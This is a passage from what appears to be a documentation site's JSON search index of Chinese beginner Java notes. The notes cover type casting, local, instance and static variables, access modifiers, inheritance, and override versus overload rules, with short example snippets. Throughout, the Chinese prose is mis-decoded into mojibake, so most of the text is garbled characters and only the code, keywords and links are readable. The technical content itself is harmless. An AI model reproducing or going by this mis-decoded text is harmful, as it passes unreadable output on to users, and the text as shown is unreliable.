æ•°æ®ç±»å‹è½¬æ¢å¿…é¡»æ»¡è¶³å¦‚ä¸‹è§„åˆ™ï¼š\n  ä¸èƒ½å¯¹ boolean ç±»å‹è¿›è¡Œç±»å‹è½¬æ¢ã€‚\n  ä¸èƒ½æŠŠå¯¹è±¡ç±»å‹è½¬æ¢æˆä¸ç›¸å…³ç±»çš„å¯¹è±¡ã€‚\n  åœ¨æŠŠå®¹é‡å¤§çš„ç±»å‹è½¬æ¢ä¸ºå®¹é‡å°çš„ç±»å‹æ—¶å¿…é¡»ä½¿ç”¨å¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚\n  è½¬æ¢è¿‡ç¨‹ä¸­å¯èƒ½å¯¼è‡´æº¢å‡ºæˆ–æŸå¤±ç²¾åº¦ï¼Œä¾‹å¦‚ï¼š\nint i =128; byte b = (byte)i; å› ä¸º byte ç±»å‹æ˜¯ 8 ä½ï¼Œæœ€å¤§å€¼ä¸º127ï¼Œæ‰€ä»¥å½“ int å¼ºåˆ¶è½¬æ¢ä¸º byte ç±»å‹æ—¶ï¼Œå€¼ 128 æ—¶å€™å°±ä¼šå¯¼è‡´æº¢å‡ºã€‚\n  æµ®ç‚¹æ•°åˆ°æ•´æ•°çš„è½¬æ¢æ˜¯é€šè¿‡èˆå¼ƒå°æ•°å¾—åˆ°ï¼Œè€Œä¸æ˜¯å››èˆäº”å…¥ï¼Œä¾‹å¦‚ï¼š\n(int)23.7 == 23; (int)-45.89f == -45;   ä¸‰ç§ç±»å‹è½¬æ¢ï¼šè‡ªåŠ¨ç±»å‹è½¬æ¢ã€å¼ºåˆ¶ç±»å‹è½¬æ¢ã€éšå«å¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚\n"},{"id":57,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/4.%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/","title":"4.å˜é‡ç±»å‹","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"å˜é‡ç±»å‹ #  åœ¨ Java è¯­è¨€ä¸­ï¼Œæ‰€æœ‰çš„å˜é‡åœ¨ä½¿ç”¨å‰å¿…é¡»å£°æ˜ã€‚å£°æ˜å˜é‡çš„åŸºæœ¬æ ¼å¼å¦‚ä¸‹ï¼š\ntype identifier [ = value][, identifier [= value] ...] ; Java è¯­è¨€æ”¯æŒçš„å˜é‡ç±»å‹æœ‰ï¼š\n ç±»å˜é‡ï¼šç‹¬ç«‹äºæ–¹æ³•ä¹‹å¤–çš„å˜é‡ï¼Œç”¨ static ä¿®é¥°ã€‚ å®ä¾‹å˜é‡ï¼šç‹¬ç«‹äºæ–¹æ³•ä¹‹å¤–çš„å˜é‡ï¼Œä¸è¿‡æ²¡æœ‰ static ä¿®é¥°ã€‚ å±€éƒ¨å˜é‡ï¼šç±»çš„æ–¹æ³•ä¸­çš„å˜é‡ã€‚  Java å±€éƒ¨å˜é‡ #   å±€éƒ¨å˜é‡å£°æ˜åœ¨æ–¹æ³•ã€æ„é€ æ–¹æ³•æˆ–è€…è¯­å¥å—ä¸­ï¼› å±€éƒ¨å˜é‡åœ¨æ–¹æ³•ã€æ„é€ æ–¹æ³•ã€æˆ–è€…è¯­å¥å—è¢«æ‰§è¡Œçš„æ—¶å€™åˆ›å»ºï¼Œå½“å®ƒä»¬æ‰§è¡Œå®Œæˆåï¼Œå˜é‡å°†ä¼šè¢«é”€æ¯ï¼› è®¿é—®ä¿®é¥°ç¬¦ä¸èƒ½ç”¨äºå±€éƒ¨å˜é‡ï¼› å±€éƒ¨å˜é‡åªåœ¨å£°æ˜å®ƒçš„æ–¹æ³•ã€æ„é€ æ–¹æ³•æˆ–è€…è¯­å¥å—ä¸­å¯è§ï¼› å±€éƒ¨å˜é‡æ˜¯åœ¨æ ˆä¸Šåˆ†é…çš„ã€‚ å±€éƒ¨å˜é‡æ²¡æœ‰é»˜è®¤å€¼ï¼Œæ‰€ä»¥å±€éƒ¨å˜é‡è¢«å£°æ˜åï¼Œå¿…é¡»ç»è¿‡åˆå§‹åŒ–ï¼Œæ‰å¯ä»¥ä½¿ç”¨ã€‚  Java å®ä¾‹å˜é‡ #   å®ä¾‹å˜é‡å£°æ˜åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œä½†åœ¨æ–¹æ³•ã€æ„é€ æ–¹æ³•å’Œè¯­å¥å—ä¹‹å¤–ï¼› å½“ä¸€ä¸ªå¯¹è±¡è¢«å®ä¾‹åŒ–ä¹‹åï¼Œæ¯ä¸ªå®ä¾‹å˜é‡çš„å€¼å°±è·Ÿç€ç¡®å®šï¼› å®ä¾‹å˜é‡åœ¨å¯¹è±¡åˆ›å»ºçš„æ—¶å€™åˆ›å»ºï¼Œåœ¨å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™é”€æ¯ï¼› å®ä¾‹å˜é‡çš„å€¼åº”è¯¥è‡³å°‘è¢«ä¸€ä¸ªæ–¹æ³•ã€æ„é€ æ–¹æ³•æˆ–è€…è¯­å¥å—å¼•ç”¨ï¼Œä½¿å¾—å¤–éƒ¨èƒ½å¤Ÿé€šè¿‡è¿™äº›æ–¹å¼è·å–å®ä¾‹å˜é‡ä¿¡æ¯ï¼› å®ä¾‹å˜é‡å¯ä»¥å£°æ˜åœ¨ä½¿ç”¨å‰æˆ–è€…ä½¿ç”¨åï¼› è®¿é—®ä¿®é¥°ç¬¦å¯ä»¥ä¿®é¥°å®ä¾‹å˜é‡ï¼› å®ä¾‹å˜é‡å¯¹äºç±»ä¸­çš„æ–¹æ³•ã€æ„é€ æ–¹æ³•æˆ–è€…è¯­å¥å—æ˜¯å¯è§çš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹åº”è¯¥æŠŠå®ä¾‹å˜é‡è®¾ä¸ºç§æœ‰ã€‚é€šè¿‡ä½¿ç”¨è®¿é—®ä¿®é¥°ç¬¦å¯ä»¥ä½¿å®ä¾‹å˜é‡å¯¹å­ç±»å¯è§ï¼› å®ä¾‹å˜é‡å…·æœ‰é»˜è®¤å€¼ã€‚æ•°å€¼å‹å˜é‡çš„é»˜è®¤å€¼æ˜¯ 0ï¼Œå¸ƒå°”å‹å˜é‡çš„é»˜è®¤å€¼æ˜¯ falseï¼Œå¼•ç”¨ç±»å‹å˜é‡çš„é»˜è®¤å€¼æ˜¯ nullã€‚å˜é‡çš„å€¼å¯ä»¥åœ¨å£°æ˜æ—¶æŒ‡å®šï¼Œä¹Ÿå¯ä»¥åœ¨æ„é€ æ–¹æ³•ä¸­æŒ‡å®šï¼› å®ä¾‹å˜é‡å¯ä»¥ç›´æ¥é€šè¿‡å˜é‡åè®¿é—®ã€‚ä½†åœ¨é™æ€æ–¹æ³•ä»¥åŠå…¶ä»–ç±»ä¸­ï¼Œå°±åº”è¯¥ä½¿ç”¨å®Œå…¨é™å®šåï¼šObejectReference.VariableNameã€‚  ç±»å˜é‡ï¼ˆé™æ€å˜é‡ï¼‰ #   ç±»å˜é‡ä¹Ÿç§°ä¸ºé™æ€å˜é‡ï¼Œåœ¨ç±»ä¸­ä»¥ statiic å…³é”®å­—å£°æ˜ï¼Œä½†å¿…é¡»åœ¨æ–¹æ³•æ„é€ æ–¹æ³•å’Œè¯­å¥å—ä¹‹å¤–ã€‚ æ— è®ºä¸€ä¸ªç±»åˆ›å»ºäº†å¤šå°‘ä¸ªå¯¹è±¡ï¼Œç±»åªæ‹¥æœ‰ç±»å˜é‡çš„ä¸€ä»½æ‹·è´ã€‚ é™æ€å˜é‡é™¤äº†è¢«å£°æ˜ä¸ºå¸¸é‡å¤–å¾ˆå°‘ä½¿ç”¨ã€‚å¸¸é‡æ˜¯æŒ‡å£°æ˜ä¸º public/privateï¼Œfinal å’Œ static ç±»å‹çš„å˜é‡ã€‚å¸¸é‡åˆå§‹åŒ–åä¸å¯æ”¹å˜ã€‚ é™æ€å˜é‡å‚¨å­˜åœ¨é™æ€å­˜å‚¨åŒºã€‚ç»å¸¸è¢«å£°æ˜ä¸ºå¸¸é‡ï¼Œå¾ˆå°‘å•ç‹¬ä½¿ç”¨ static å£°æ˜å˜é‡ã€‚ é™æ€å˜é‡åœ¨ç¬¬ä¸€æ¬¡è¢«è®¿é—®æ—¶åˆ›å»ºï¼Œåœ¨ç¨‹åºç»“æŸæ—¶é”€æ¯ã€‚ ä¸å®ä¾‹å˜é‡å…·æœ‰ç›¸ä¼¼çš„å¯è§æ€§ã€‚ä½†ä¸ºäº†å¯¹ç±»çš„ä½¿ç”¨è€…å¯è§ï¼Œå¤§å¤šæ•°é™æ€å˜é‡å£°æ˜ä¸º public ç±»å‹ã€‚ é»˜è®¤å€¼å’Œå®ä¾‹å˜é‡ç›¸ä¼¼ã€‚æ•°å€¼å‹å˜é‡é»˜è®¤å€¼æ˜¯ 0ï¼Œå¸ƒå°”å‹é»˜è®¤å€¼æ˜¯ falseï¼Œå¼•ç”¨ç±»å‹é»˜è®¤å€¼æ˜¯ nullã€‚å˜é‡çš„å€¼å¯ä»¥åœ¨å£°æ˜çš„æ—¶å€™æŒ‡å®šï¼Œä¹Ÿå¯ä»¥åœ¨æ„é€ æ–¹æ³•ä¸­æŒ‡å®šã€‚æ­¤å¤–ï¼Œé™æ€å˜é‡è¿˜å¯ä»¥åœ¨é™æ€è¯­å¥å—ä¸­åˆå§‹åŒ–ã€‚ é™æ€å˜é‡å¯ä»¥é€šè¿‡ï¼šClassName.VariableName çš„æ–¹å¼è®¿é—®ã€‚ ç±»å˜é‡è¢«å£°æ˜ä¸º public static final ç±»å‹æ—¶ï¼Œç±»å˜é‡åç§°ä¸€èˆ¬å»ºè®®ä½¿ç”¨å¤§å†™å­—æ¯ã€‚å¦‚æœé™æ€å˜é‡ä¸æ˜¯ public å’Œ final ç±»å‹ï¼Œå…¶å‘½åæ–¹å¼ä¸å®ä¾‹å˜é‡ä»¥åŠå±€éƒ¨å˜é‡çš„å‘½åæ–¹å¼ä¸€è‡´ã€‚  "},{"id":58,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/5.%E4%BF%AE%E9%A5%B0%E7%AC%A6/","title":"5.ä¿®é¥°ç¬¦","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"ä¿®é¥°ç¬¦ #  è®¿é—®ä¿®é¥°ç¬¦ #  Javaä¸­ï¼Œå¯ä»¥ä½¿ç”¨è®¿é—®æ§åˆ¶ç¬¦æ¥ä¿æŠ¤å¯¹ç±»ã€å˜é‡ã€æ–¹æ³•å’Œæ„é€ æ–¹æ³•çš„è®¿é—®ã€‚Java æ”¯æŒ 4 ç§ä¸åŒçš„è®¿é—®æƒé™ã€‚\n default (å³ç¼ºçœï¼Œä»€ä¹ˆä¹Ÿä¸å†™ï¼‰: åœ¨åŒä¸€åŒ…å†…å¯è§ï¼Œä¸ä½¿ç”¨ä»»ä½•ä¿®é¥°ç¬¦ã€‚ä½¿ç”¨å¯¹è±¡ï¼šç±»ã€æ¥å£ã€å˜é‡ã€æ–¹æ³•ã€‚ private : åœ¨åŒä¸€ç±»å†…å¯è§ã€‚ä½¿ç”¨å¯¹è±¡ï¼šå˜é‡ã€æ–¹æ³•ã€‚ æ³¨æ„ï¼šä¸èƒ½ä¿®é¥°ç±»ï¼ˆå¤–éƒ¨ç±»ï¼‰ public : å¯¹æ‰€æœ‰ç±»å¯è§ã€‚ä½¿ç”¨å¯¹è±¡ï¼šç±»ã€æ¥å£ã€å˜é‡ã€æ–¹æ³• protected : å¯¹åŒä¸€åŒ…å†…çš„ç±»å’Œæ‰€æœ‰å­ç±»å¯è§ã€‚ä½¿ç”¨å¯¹è±¡ï¼šå˜é‡ã€æ–¹æ³•ã€‚ æ³¨æ„ï¼šä¸èƒ½ä¿®é¥°ç±»ï¼ˆå¤–éƒ¨ç±»ï¼‰ã€‚  æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹è¡¨æ¥è¯´æ˜è®¿é—®æƒé™ï¼š\n   ä¿®é¥°ç¬¦ å½“å‰ç±» åŒä¸€åŒ…å†… å­å­™ç±»(åŒä¸€åŒ…) å­å­™ç±»(ä¸åŒåŒ…) å…¶ä»–åŒ…     public Y Y Y Y Y   protected Y Y Y Y/Nï¼ˆè¯´æ˜ï¼‰ N   default Y Y Y N N   private Y N N N N    éè®¿é—®ä¿®é¥°ç¬¦ #  ä¸ºäº†å®ç°ä¸€äº›å…¶ä»–çš„åŠŸèƒ½ï¼ŒJava ä¹Ÿæä¾›äº†è®¸å¤šéè®¿é—®ä¿®é¥°ç¬¦ã€‚\n  static ä¿®é¥°ç¬¦ï¼Œç”¨æ¥ä¿®é¥°ç±»æ–¹æ³•å’Œç±»å˜é‡ã€‚\n  final ä¿®é¥°ç¬¦ï¼Œç”¨æ¥ä¿®é¥°ç±»ã€æ–¹æ³•å’Œå˜é‡ï¼Œfinal ä¿®é¥°çš„ç±»ä¸èƒ½å¤Ÿè¢«ç»§æ‰¿ï¼Œä¿®é¥°çš„æ–¹æ³•ä¸èƒ½è¢«ç»§æ‰¿ç±»é‡æ–°å®šä¹‰ï¼Œä¿®é¥°çš„å˜é‡ä¸ºå¸¸é‡ï¼Œæ˜¯ä¸å¯ä¿®æ”¹çš„ã€‚\n  abstract ä¿®é¥°ç¬¦ï¼Œç”¨æ¥åˆ›å»ºæŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•ã€‚\n  synchronized å’Œ volatile ä¿®é¥°ç¬¦ï¼Œä¸»è¦ç”¨äºçº¿ç¨‹çš„ç¼–ç¨‹ã€‚\n  "},{"id":59,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/6.%E8%BF%90%E7%AE%97%E7%AC%A6/","title":"6.è¿ç®—ç¬¦","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"è¿ç®—ç¬¦ #  http://www.runoob.com/java/java-operators.html\n"},{"id":60,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/7.%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/","title":"7.å¾ªç¯ç»“æ„","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"å¾ªç¯ç»“æ„ #  http://www.runoob.com/java/java-loop.html\n"},{"id":61,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/8.%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/","title":"8.æ¡ä»¶è¯­å¥","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"æ¡ä»¶è¯­å¥ #  http://www.runoob.com/java/java-if-else-switch.html\n"},{"id":62,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/9.number%E5%92%8Cmath%E7%B1%BB/","title":"9. Numberå’Œ Mathç±»","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"Number #  æ‰€æœ‰çš„åŒ…è£…ç±»**ï¼ˆIntegerã€Longã€Byteã€Doubleã€Floatã€Shortï¼‰**éƒ½æ˜¯æŠ½è±¡ç±» Number çš„å­ç±»ï¼Œå¦‚ä¸‹å›¾ï¼š\nè¿™ç§ç”±ç¼–è¯‘å™¨ç‰¹åˆ«æ”¯æŒçš„åŒ…è£…ç§°ä¸ºè£…ç®±ï¼Œæ‰€ä»¥å½“å†…ç½®æ•°æ®ç±»å‹è¢«å½“ä½œå¯¹è±¡ä½¿ç”¨çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨ä¼šæŠŠå†…ç½®ç±»å‹è£…ç®±ä¸ºåŒ…è£…ç±»ã€‚ç›¸ä¼¼çš„ï¼Œç¼–è¯‘å™¨ä¹Ÿå¯ä»¥æŠŠä¸€ä¸ªå¯¹è±¡æ‹†ç®±ä¸ºå†…ç½®ç±»å‹ã€‚Number ç±»å±äº java.lang åŒ…ã€‚\nMath ç±» #  Java çš„ Math åŒ…å«äº†ç”¨äºæ‰§è¡ŒåŸºæœ¬æ•°å­¦è¿ç®—çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚åˆç­‰æŒ‡æ•°ã€å¯¹æ•°ã€å¹³æ–¹æ ¹å’Œä¸‰è§’å‡½æ•°ã€‚\nMath çš„æ–¹æ³•éƒ½è¢«å®šä¹‰ä¸º static å½¢å¼ï¼Œé€šè¿‡ Math ç±»å¯ä»¥åœ¨ä¸»å‡½æ•°ä¸­ç›´æ¥è°ƒç”¨ã€‚\nä¸‹é¢çš„è¡¨ä¸­åˆ—å‡ºçš„æ˜¯ Number \u0026amp; Math ç±»å¸¸ç”¨çš„ä¸€äº›æ–¹æ³•ï¼šhttp://www.runoob.com/java/java-number.html\n"},{"id":63,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/1.%E7%BB%A7%E6%89%BF/","title":"1.ç»§æ‰¿","section":"èœé¸Ÿé¢å‘å¯¹è±¡","content":"ç»§æ‰¿ #  ç±»çš„ç»§æ‰¿æ ¼å¼ #  åœ¨ Java ä¸­é€šè¿‡ extends å…³é”®å­—å¯ä»¥ç”³æ˜ä¸€ä¸ªç±»æ˜¯ä»å¦å¤–ä¸€ä¸ªç±»ç»§æ‰¿è€Œæ¥çš„ï¼Œä¸€èˆ¬å½¢å¼å¦‚ä¸‹ï¼š\nclass çˆ¶ç±» { }  class å­ç±» extends çˆ¶ç±» { } ç»§æ‰¿ç±»å‹ #  éœ€è¦æ³¨æ„çš„æ˜¯ Java ä¸æ”¯æŒå¤šç»§æ‰¿ï¼Œä½†æ”¯æŒå¤šé‡ç»§æ‰¿ï¼š\nç»§æ‰¿çš„ç‰¹æ€§ #   å­ç±»æ‹¥æœ‰çˆ¶ç±»é private çš„å±æ€§ã€æ–¹æ³•ã€‚ å­ç±»å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•ï¼Œå³å­ç±»å¯ä»¥å¯¹çˆ¶ç±»è¿›è¡Œæ‰©å±•ã€‚ å­ç±»å¯ä»¥ç”¨è‡ªå·±çš„æ–¹å¼å®ç°çˆ¶ç±»çš„æ–¹æ³•ã€‚ Java çš„ç»§æ‰¿æ˜¯å•ç»§æ‰¿ï¼Œä½†æ˜¯å¯ä»¥å¤šé‡ç»§æ‰¿ï¼Œå•ç»§æ‰¿å°±æ˜¯ä¸€ä¸ªå­ç±»åªèƒ½ç»§æ‰¿ä¸€ä¸ªçˆ¶ç±»ï¼Œå¤šé‡ç»§æ‰¿å°±æ˜¯ï¼Œä¾‹å¦‚ A ç±»ç»§æ‰¿ B ç±»ï¼ŒB ç±»ç»§æ‰¿ C ç±»ï¼Œæ‰€ä»¥æŒ‰ç…§å…³ç³»å°±æ˜¯ C ç±»æ˜¯ B ç±»çš„çˆ¶ç±»ï¼ŒB ç±»æ˜¯ A ç±»çš„çˆ¶ç±»ï¼Œè¿™æ˜¯ Java ç»§æ‰¿åŒºåˆ«äº C++ ç»§æ‰¿çš„ä¸€ä¸ªç‰¹æ€§ã€‚ æé«˜äº†ç±»ä¹‹é—´çš„è€¦åˆæ€§ï¼ˆç»§æ‰¿çš„ç¼ºç‚¹ï¼Œè€¦åˆåº¦é«˜å°±ä¼šé€ æˆä»£ç ä¹‹é—´çš„è”ç³»è¶Šç´§å¯†ï¼Œä»£ç ç‹¬ç«‹æ€§è¶Šå·®ï¼‰ã€‚  ç»§æ‰¿å…³é”®å­— #  ç»§æ‰¿å¯ä»¥ä½¿ç”¨ extends å’Œ implements è¿™ä¸¤ä¸ªå…³é”®å­—æ¥å®ç°ç»§æ‰¿ï¼Œè€Œä¸”æ‰€æœ‰çš„ç±»éƒ½æ˜¯ç»§æ‰¿äº java.lang.Objectï¼Œå½“ä¸€ä¸ªç±»æ²¡æœ‰ç»§æ‰¿çš„ä¸¤ä¸ªå…³é”®å­—ï¼Œåˆ™é»˜è®¤ç»§æ‰¿objectï¼ˆè¿™ä¸ªç±»åœ¨ java.lang åŒ…ä¸­ï¼Œæ‰€ä»¥ä¸éœ€è¦ importï¼‰ç¥–å…ˆç±»ã€‚\nextends #  åœ¨ Java ä¸­ï¼Œç±»çš„ç»§æ‰¿æ˜¯å•ä¸€ç»§æ‰¿ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªå­ç±»åªèƒ½æ‹¥æœ‰ä¸€ä¸ªçˆ¶ç±»ï¼Œæ‰€ä»¥ extends åªèƒ½ç»§æ‰¿ä¸€ä¸ªç±»ï¼š\npublic class Animal {  private String name;  private int id;  public Animal(String myName, String myid) {  //åˆå§‹åŒ–å±æ€§å€¼  }  public void eat() { //åƒä¸œè¥¿æ–¹æ³•çš„å…·ä½“å®ç° }  public void sleep() { //ç¡è§‰æ–¹æ³•çš„å…·ä½“å®ç° } }  public class Penguin extends Animal{ } implements #  ä½¿ç”¨ implements å…³é”®å­—å¯ä»¥å˜ç›¸çš„ä½¿ java å…·æœ‰å¤šç»§æ‰¿çš„ç‰¹æ€§ï¼Œä½¿ç”¨èŒƒå›´ä¸ºç±»ç»§æ‰¿æ¥å£çš„æƒ…å†µï¼Œå¯ä»¥åŒæ—¶ç»§æ‰¿å¤šä¸ªæ¥å£ï¼ˆæ¥å£è·Ÿæ¥å£ä¹‹é—´é‡‡ç”¨é€—å·åˆ†éš”ï¼‰ã€‚\npublic interface A {  public void eat();  public void sleep(); }  public interface B {  public void show(); }  public class C implements A,B { } super #  super å…³é”®å­—ï¼šæˆ‘ä»¬å¯ä»¥é€šè¿‡ super å…³é”®å­—æ¥å®ç°å¯¹çˆ¶ç±»æˆå‘˜çš„è®¿é—®ï¼Œç”¨æ¥å¼•ç”¨å½“å‰å¯¹è±¡çš„çˆ¶ç±»ã€‚\nthis #  this å…³é”®å­—ï¼šæŒ‡å‘è‡ªå·±çš„å¼•ç”¨ã€‚\nfinal #  final å…³é”®å­—å£°æ˜ç±»å¯ä»¥æŠŠç±»å®šä¹‰ä¸ºä¸èƒ½ç»§æ‰¿çš„ï¼Œå³æœ€ç»ˆç±»ï¼›æˆ–è€…ç”¨äºä¿®é¥°æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸èƒ½è¢«å­ç±»é‡å†™ï¼š\n  å£°æ˜ç±»ï¼š\nfinal class ç±»å {  //ç±»ä½“ }   å£°æ˜æ–¹æ³•ï¼š\nä¿®é¥°ç¬¦(public/private/default/protected) final è¿”å›å€¼ç±»å‹ æ–¹æ³•å () {  //æ–¹æ³•ä½“ }   æ³¨ï¼šå®ä¾‹å˜é‡ä¹Ÿå¯ä»¥è¢«å®šä¹‰ä¸º finalï¼Œè¢«å®šä¹‰ä¸º final çš„å˜é‡ä¸èƒ½è¢«ä¿®æ”¹ã€‚è¢«å£°æ˜ä¸º final ç±»çš„æ–¹æ³•è‡ªåŠ¨åœ°å£°æ˜ä¸º finalï¼Œä½†æ˜¯å®ä¾‹å˜é‡å¹¶ä¸æ˜¯ final\n"},{"id":64,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2.%E9%87%8D%E5%86%99%E4%B8%8E%E9%87%8D%E8%BD%BD/","title":"2.é‡å†™ä¸é‡è½½","section":"èœé¸Ÿé¢å‘å¯¹è±¡","content":"é‡å†™ä¸é‡è½½ #  é‡å†™ Override #  é‡å†™æ˜¯å­ç±»å¯¹çˆ¶ç±»çš„å…è®¸è®¿é—®çš„æ–¹æ³•çš„å®ç°è¿‡ç¨‹è¿›è¡Œé‡æ–°ç¼–å†™, è¿”å›å€¼å’Œå½¢å‚éƒ½ä¸èƒ½æ”¹å˜ã€‚å³å¤–å£³ä¸å˜ï¼Œæ ¸å¿ƒé‡å†™ï¼\né‡å†™çš„å¥½å¤„åœ¨äºå­ç±»å¯ä»¥æ ¹æ®éœ€è¦ï¼Œå®šä¹‰ç‰¹å®šäºè‡ªå·±çš„è¡Œä¸ºã€‚ ä¹Ÿå°±æ˜¯è¯´å­ç±»èƒ½å¤Ÿæ ¹æ®éœ€è¦å®ç°çˆ¶ç±»çš„æ–¹æ³•ã€‚\næ–¹æ³•çš„é‡å†™è§„åˆ™ï¼š\n å‚æ•°åˆ—è¡¨å¿…é¡»å®Œå…¨ä¸è¢«é‡å†™æ–¹æ³•çš„ç›¸åŒï¼› è¿”å›ç±»å‹å¿…é¡»å®Œå…¨ä¸è¢«é‡å†™æ–¹æ³•çš„è¿”å›ç±»å‹ç›¸åŒï¼› è®¿é—®æƒé™ä¸èƒ½æ¯”çˆ¶ç±»ä¸­è¢«é‡å†™çš„æ–¹æ³•çš„è®¿é—®æƒé™æ›´ä½ã€‚ä¾‹å¦‚ï¼šå¦‚æœçˆ¶ç±»çš„ä¸€ä¸ªæ–¹æ³•è¢«å£°æ˜ä¸º publicï¼Œé‚£ä¹ˆåœ¨å­ç±»ä¸­é‡å†™è¯¥æ–¹æ³•å°±ä¸èƒ½å£°æ˜ä¸º protectedã€‚ çˆ¶ç±»çš„æˆå‘˜æ–¹æ³•åªèƒ½è¢«å®ƒçš„å­ç±»é‡å†™ã€‚ å£°æ˜ä¸º final çš„æ–¹æ³•ä¸èƒ½è¢«é‡å†™ã€‚ å£°æ˜ä¸º static çš„æ–¹æ³•ä¸èƒ½è¢«é‡å†™ï¼Œä½†æ˜¯èƒ½å¤Ÿè¢«å†æ¬¡å£°æ˜ã€‚ å­ç±»å’Œçˆ¶ç±»åœ¨åŒä¸€ä¸ªåŒ…ä¸­ï¼Œé‚£ä¹ˆå­ç±»å¯ä»¥é‡å†™çˆ¶ç±»æ‰€æœ‰æ–¹æ³•ï¼Œé™¤äº†å£°æ˜ä¸º private å’Œ final çš„æ–¹æ³•ã€‚ å­ç±»å’Œçˆ¶ç±»ä¸åœ¨åŒä¸€ä¸ªåŒ…ä¸­ï¼Œé‚£ä¹ˆå­ç±»åªèƒ½å¤Ÿé‡å†™çˆ¶ç±»çš„å£°æ˜ä¸º public å’Œ protected çš„é final æ–¹æ³•ã€‚ é‡å†™çš„æ–¹æ³•èƒ½å¤ŸæŠ›å‡ºä»»ä½•éå¼ºåˆ¶å¼‚å¸¸ï¼Œæ— è®ºè¢«é‡å†™çš„æ–¹æ³•æ˜¯å¦æŠ›å‡ºå¼‚å¸¸ã€‚ä½†æ˜¯ï¼Œé‡å†™çš„æ–¹æ³•ä¸èƒ½æŠ›å‡ºæ–°çš„å¼ºåˆ¶æ€§å¼‚å¸¸ï¼Œæˆ–è€…æ¯”è¢«é‡å†™æ–¹æ³•å£°æ˜çš„æ›´å¹¿æ³›çš„å¼ºåˆ¶æ€§å¼‚å¸¸ï¼Œåä¹‹åˆ™å¯ä»¥ã€‚ æ„é€ æ–¹æ³•ä¸èƒ½è¢«é‡å†™ã€‚ å¦‚æœä¸èƒ½ç»§æ‰¿ä¸€ä¸ªæ–¹æ³•ï¼Œåˆ™ä¸èƒ½é‡å†™è¿™ä¸ªæ–¹æ³•ã€‚  NOTICE: å½“éœ€è¦åœ¨å­ç±»ä¸­è°ƒç”¨çˆ¶ç±»çš„è¢«é‡å†™æ–¹æ³•æ—¶ï¼Œè¦ä½¿ç”¨ super å…³é”®å­—ã€‚\né‡è½½ Overload #  é‡è½½ (overloading) æ˜¯åœ¨ä¸€ä¸ªç±»é‡Œé¢ï¼Œæ–¹æ³•åå­—ç›¸åŒï¼Œè€Œå‚æ•°ä¸åŒã€‚è¿”å›ç±»å‹å¯ä»¥ç›¸åŒä¹Ÿå¯ä»¥ä¸åŒã€‚\næ¯ä¸ªé‡è½½çš„æ–¹æ³•ï¼ˆæˆ–è€…æ„é€ å‡½æ•°ï¼‰éƒ½å¿…é¡»æœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„å‚æ•°ç±»å‹åˆ—è¡¨ã€‚\næœ€å¸¸ç”¨çš„åœ°æ–¹å°±æ˜¯æ„é€ å™¨çš„é‡è½½ã€‚\nè§„åˆ™ï¼š\n è¢«é‡è½½çš„æ–¹æ³•å¿…é¡»æ”¹å˜å‚æ•°åˆ—è¡¨(å‚æ•°ä¸ªæ•°æˆ–ç±»å‹ä¸ä¸€æ ·)ï¼› è¢«é‡è½½çš„æ–¹æ³•å¯ä»¥æ”¹å˜è¿”å›ç±»å‹ï¼› è¢«é‡è½½çš„æ–¹æ³•å¯ä»¥æ”¹å˜è®¿é—®ä¿®é¥°ç¬¦ï¼› è¢«é‡è½½çš„æ–¹æ³•å¯ä»¥å£°æ˜æ–°çš„æˆ–æ›´å¹¿çš„æ£€æŸ¥å¼‚å¸¸ï¼› 